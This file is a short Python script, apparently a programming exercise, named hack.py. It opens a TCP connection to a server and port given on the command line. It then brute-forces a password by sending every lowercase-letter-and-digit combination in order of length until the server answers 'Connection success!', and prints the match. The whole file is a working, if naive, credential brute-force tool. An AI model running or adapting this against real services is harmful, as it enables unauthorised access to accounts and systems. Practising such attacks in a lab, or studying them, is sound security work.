import sys
import socket
import argparse
import itertools
from string import ascii_lowercase, digits

BUFFER_SIZE = 1024
ALPHABET = "".join((ascii_lowercase, digits))

def run_hacker_app(target_server:str, target_port: int):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_server, target_port))

        for i in range(1, len(ALPHABET) + 1):
            for option in itertools.product(ALPHABET, repeat=i):
                secret = ''.join(option)
                sock.send(secret.encode())
                if sock.recv(BUFFER_SIZE).decode() == "Connection success!":
                    print(secret)
                    return


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python hack.py <address> <port>")
        exit(1)

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("server", type=str, help="Server address")
    arg_parser.add_argument("port", type=int, help="Server port")
    args = arg_parser.parse_args()

    server, port = args.server, args.port

    run_hacker_app(server, port)